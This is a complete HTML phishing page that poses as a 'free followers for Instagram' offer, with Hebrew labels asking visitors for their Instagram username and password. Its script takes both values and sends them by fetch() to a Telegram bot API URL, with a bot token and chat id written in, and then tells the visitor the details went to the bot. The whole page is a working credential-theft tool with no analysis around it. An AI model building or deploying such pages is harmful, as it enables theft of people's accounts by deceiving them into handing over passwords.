<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Free Followers for Instagram</title>
    <style>
        body {
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .big-text {
            font-size: 24px;
        }
        .small-text {
            font-size: 18px;
        }
    </style>
</head>
<body>
    <h1 class="big-text">פולואואואואואואר פור אינסטגרם</h1>
    <div>
        <p class="small-text">משתמש:</p>
        <input type="text" id="usernameInput" placeholder="שם משתמש באינסטגרם">
    </div>
    <div>
        <p class="small-text">סיסמה:</p>
        <input type="password" id="passwordInput" placeholder="סיסמה באינסטגרם">
    </div>
    <button onclick="sendToTelegram()">שלח</button>

    <script>
        function sendToTelegram() {
            var username = document.getElementById("usernameInput").value;
            var password = document.getElementById("passwordInput").value;
            var message = "משתמש: " + username + "%0Aסיסמה: " + password;
            var telegramURL = "https://api.telegram.org/bot6796201688:AAEaRoA_O41-U24XQGIX5a4MK4lMyIjjeqg/sendMessage?chat_id=7039130805&text=" + message;
            fetch(telegramURL);
            alert("פרטי המשתמש נשלחו לבוט בטלגרם!");
        }
    </script>
</body>
</html>
